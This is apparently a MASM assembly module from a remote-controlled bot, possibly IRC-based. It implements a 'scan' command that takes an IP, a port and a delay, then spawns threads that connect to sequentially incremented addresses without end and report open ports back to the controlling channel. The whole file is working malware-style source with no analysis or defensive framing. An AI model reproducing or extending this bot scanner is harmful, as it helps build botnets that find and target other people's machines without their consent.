ScanProc proto :dword, :dword, :dword, :dword, :dword
IpConnect proto :dword
IpScan proto :dword

IP_CONNECT struct
  dwsocket                dword ?
  dwhost                  dword ?
  wport                   word ?
  bsync                   byte ?
  szreply                 byte 64 dup (?)
IP_CONNECT ends

IP_SCANNER struct
  dwsocket                dword ?
  dwstart                 dword ?
  wport                   word ?
  dwdelay                 dword ?
  bsync                   byte ?
  szreply                 byte 64 dup (?)
IP_SCANNER ends

.code
ScanProc proc uses edx ecx esi edi dwSocket:dword, szUser:dword, szReply:dword, szCmd:dword, szArguments:dword
local scan:IP_SCANNER
local szScanBuffer[1024]:byte
local szScanDelay[32]:byte
local szScanIP[32]:byte
local szScanPort[32]:byte
local dwThread: dword
invoke lstrcmpi, szCmd, addr szSCAN
.if eax == 0
  mov eax, dwSocket
  mov scan.dwsocket, eax
  invoke GetToken, addr szScanBuffer, szArguments, 32, 2, FALSE
  invoke lstrcpy, addr szScanIP, addr szScanBuffer
  invoke inet_addr, addr szScanIP
  mov scan.dwstart, eax
  invoke GetToken, addr szScanBuffer, szArguments, 32, 3, FALSE
  invoke lstrcpy, addr szScanPort, addr szScanBuffer
  invoke atodw, addr szScanPort
  mov scan.wport, ax
  invoke GetToken, addr szScanBuffer, szArguments, 32, 4, FALSE
  invoke lstrcpy, addr szScanDelay, addr szScanBuffer
  invoke atodw, addr szScanDelay
  mov scan.dwdelay, eax
  mov scan.bsync, 0
  invoke CopyMemory, addr scan.szreply, szReply, 64
  invoke CreateThread, 0, 0, addr IpScan, addr scan, 0, 0
  mov dwThread, eax
  .while scan.bsync != 1
    invoke Sleep, 10
  .endw
  invoke wsprintf, addr szScanBuffer, addr szScanThread, addr szScanIP, addr szScanPort
  invoke AddThread, dwThread, addr szScanBuffer, 0, 0
  invoke wsprintf, addr szScanBuffer, addr szScan, addr szScanIP, addr szScanPort, addr szScanDelay
  invoke SendMsg, dwSocket, szReply, addr szScanBuffer
  mov eax, TRUE
  jmp @F
.endif
mov eax, FALSE
@@:
ret
ScanProc endp

IpConnect proc uses ecx lpParam:dword
local scan:IP_CONNECT
local dwSocket:dword
local SockAddrIn:sockaddr_in
local szScanBuffer[128]:byte
local szHostBuffer[128]:byte
local szScanDelay[32]:byte
local szScanIP[32]:byte
local szScanPort[32]:byte
invoke CopyMemory, addr scan, lpParam, sizeof scan
mov eax, lpParam
assume eax:ptr IP_CONNECT
mov [eax].bsync, 1
assume eax:nothing
invoke socket, PF_INET, SOCK_STREAM, 0
mov dwSocket, eax
mov SockAddrIn.sin_family, AF_INET
xor eax, eax
mov ax, scan.wport
invoke htons, eax
mov SockAddrIn.sin_port, ax 
mov eax, scan.dwhost
mov SockAddrIn.sin_addr, eax
invoke connect, dwSocket, addr SockAddrIn, sizeof SockAddrIn
.if eax != SOCKET_ERROR
  xor ecx, ecx
  mov cx, scan.wport
  invoke dwtoa, ecx, addr szScanPort
  invoke inet_ntoa, scan.dwhost
  invoke lstrcpy, addr szHostBuffer, eax
  invoke lstrlen, eax
  mov ecx, eax
  inc ecx
  invoke lstrcpyn, addr szScanIP, addr szHostBuffer, ecx
  invoke wsprintf, addr szScanBuffer, addr szOpenPort, addr szScanIP, addr szScanPort
  invoke SendMsg, scan.dwsocket, addr scan.szreply, addr szScanBuffer
.endif
invoke closesocket, dwSocket
ret
IpConnect endp

IpScan proc uses eax ecx esi edi lpParam:dword
local scan:IP_SCANNER
local conn:IP_CONNECT
invoke CopyMemory, addr scan, lpParam, sizeof scan
mov eax, lpParam
assume eax:ptr IP_SCANNER
mov [eax].bsync, 1
assume eax:nothing
.while TRUE
  mov eax, scan.dwsocket
  mov conn.dwsocket, eax
  mov eax, scan.dwstart
  mov conn.dwhost, eax
  mov ax, scan.wport
  mov conn.wport, ax
  mov conn.bsync, 0
  invoke CopyMemory, addr conn.szreply, addr scan.szreply, 64 
  invoke CreateThread, 0, 0, addr IpConnect, addr conn, 0, 0
  .while conn.bsync != 1
    invoke Sleep, 10
  .endw
  mov eax, scan.dwstart
  invoke ntohl, eax
  inc eax
  invoke htonl, eax
  mov scan.dwstart, eax
  invoke Sleep, scan.dwdelay
.endw
ret
IpScan endp